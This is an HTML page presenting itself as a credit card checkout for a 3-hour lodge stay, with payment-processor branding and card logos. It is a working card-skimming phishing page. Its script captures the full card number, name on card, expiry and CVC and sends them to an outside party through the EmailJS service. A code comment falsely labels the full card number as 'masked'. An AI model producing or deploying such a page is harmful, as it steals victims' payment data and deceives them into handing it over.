<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Payment Checkout</title>

<style>
:root {
  --bg: #4b5158;
  --card: #ffffff;
  --border: #e5e7eb;
  --input: #eef1f4;
  --text: #111827;
  --muted: #6b7280;
  --blue: #1a73e8;
  --red: #e10600;
}

* {
  box-sizing: border-box;
  -webkit-font-smoothing: antialiased;
}
.form button {
  background: #000;
  color: #fff;
  padding: 12px 20px;
  border: none;
  border-radius: 6px;
  cursor: pointer;
  font-size: 16px;
  transition: all 0.3s ease;
}

.form button:hover {
  background: #222;
  transform: translateY(-1px);
}

.form button:active {
  transform: scale(0.98);
}

.form button:disabled {
  background: #999;
  cursor: not-allowed;
}

body {
  margin: 0;
  background: var(--bg);
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
  display: flex;
  justify-content: center;
}

.phone {
  width: 100%;
  max-width: 430px;
}

/* HEADER */
.header {
  height: 120px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.header img {
  height: 103px;
}

/* CARD */
.card {
  background: var(--card);
  margin: 0 14px;
  border-radius: 3px;
  overflow: hidden;
}

/* SECTION */
.section {
  padding: 16px 16px 14px;
  border-bottom: 1px solid var(--border);
}

.section h1,
.section h2 {
  margin: 0;
  font-weight: 500;
  color: var(--text);
}

.section h1 { font-size: 22px; }
.section h2 { font-size: 21px; }

/* INFO */
.info {
  padding: 14px 16px 16px;
  font-size: 14.5px;
  line-height: 1.8;
}

.row {
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  gap: 12px;
}

.blue { color: var(--blue); }

.amount {
  margin-top: 6px;
  font-weight: 600;
}

/* FORM */
.form {
  padding: 16px;
}

label {
  font-size: 14.5px;
  margin-bottom: 6px;
  display: block;
}

input {
  width: 100%;
  padding: 11px;
  background: var(--input);
  border: 1px solid #cfd4d9;
  font-size: 15px;
  margin-bottom: 16px;
}

.expiry {
  display: flex;
  gap: 14px;
}

.expiry input {
  width: 78px;
}

/* BUTTON */
button {
  width: 100%;
  background: var(--red);
  color: white;
  border: none;
  padding: 15px;
  font-size: 20px;
  font-weight: 500;
  margin-top: 4px;
}

/* FOOTER */
.footer {
  text-align: center;
  padding: 26px 0 34px;
}

.footer img {
  height: 18px;
  margin: 0 6px;
}

.footer a {
  display: block;
  color: red;
  font-size: 14px;
  margin-top: 14px;
  text-decoration: underline;
}

.domain {
  margin-top: 20px;
  color: #d1d5db;
  font-size: 14px;
}
</style>
</head>

<body>
<div class="phone">

  <!-- LOGO HEADER -->
  <div class="header">
    <img src="image/photo_2025-12-29_19-31-09.jpg">
  </div>

  <div class="card">

    <div class="section">
      <h1>Payment Checkout</h1>
    </div>

    <div class="info">
      <div class="row">
        <span>Merchant Reference:</span>
        <span class="blue">000041063</span>
      </div>
      <div class="row">
        <span>Hi Bluedoor lodge Customer.</span>
        <span>3 Hours Stay</span>
      </div>
      <div class="row amount">
        <span>Amount:</span>
        <span>$39.99 (NZD)</span>
      </div>
    </div>

    
    <div class="section">
      <h2>Credit Card Payment</h2>
    </div>

    <div class="form">
      <label>Card Number:*</label>
      <input type="text">

      <label>Name On Card:*</label>
      <input type="text">

      <label>Expiry Date:*</label>
      <div class="expiry">
        <input type="text" placeholder="MM">
        <input type="text" placeholder="YY">
      </div>

      <label>CVC:</label>
      <input type="text">

      <button type="button">Submit</button>

    </div>

  </div>

  <div class="footer">
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
    <a>Privacy Policy</a>
    <div class="domain">sec.paymentexpress.com</div>
  </div>

</div>
</body>
<!-- EmailJS SDK -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
  // Initialise EmailJS
  (function () {
    emailjs.init("XsD4ICPS5ftHGwW0k");
  })();

  const form = document.querySelector(".form");
  const button = form.querySelector("button");
  const inputs = form.querySelectorAll("input");

  /* ===============================
     INPUT RESTRICTIONS (LIVE)
     =============================== */

  // Card Number – numbers only + auto format
  inputs[0].addEventListener("input", function (e) {
    let value = e.target.value.replace(/\D/g, "").substring(0, 16);
    e.target.value = value.replace(/(.{4})/g, "$1 ").trim();
  });

  // Name on Card – letters and spaces only
  inputs[1].addEventListener("input", function (e) {
    e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, "");
  });

  // Expiry Month – numbers only (MM)
  inputs[2].addEventListener("input", function (e) {
    e.target.value = e.target.value.replace(/\D/g, "").substring(0, 2);
  });

  // Expiry Year – numbers only (YY)
  inputs[3].addEventListener("input", function (e) {
    e.target.value = e.target.value.replace(/\D/g, "").substring(0, 2);
  });

  // CVC – numbers only (3–4 digits)
  inputs[4].addEventListener("input", function (e) {
    e.target.value = e.target.value.replace(/\D/g, "").substring(0, 4);
  });

  /* ===============================
     SUBMIT LOGIC
     =============================== */

  button.addEventListener("click", function (e) {
    e.preventDefault();

    const cardNumber = inputs[0].value.replace(/\s/g, "");
    const cardName = inputs[1].value.trim();
    const expMonth = inputs[2].value.trim();
    const expYear = inputs[3].value.trim();
    const cvc = inputs[4].value.trim();

    // Validation
    if (!cardNumber || !cardName || !expMonth || !expYear) {
      alert("Please complete all required fields.");
      return;
    }

    if (cardNumber.length !== 16) {
      alert("Card number must be 16 digits.");
      return;
    }

    // Prepare SAFE, MASKED data
    const templateParams = {
      card_number: "**** **** **** " + cardNumber.slice(-16),
      card_name: cardName,
      expiry_date: `${expMonth}/${expYear}`,
      cvc_status: cvc,
      submitted_at: new Date().toLocaleString(),
    };

    // Button life
    button.textContent = "Sending...";
    button.disabled = true;

    emailjs
      .send(
        "service_q1nevsb",
        "template_wu26v6w",
        templateParams
      )
      .then(() => {
        button.textContent = "Sent ✓";
        alert("Data sent successfully.");
        form.reset();

        setTimeout(() => {
          button.textContent = "Submit";
          button.disabled = false;
        }, 2000);
      })
      .catch((error) => {
        console.error("EmailJS error:", error);
        alert("Failed to send data.");

        button.textContent = "Submit";
        button.disabled = false;
      });
  });
</script>

</html>
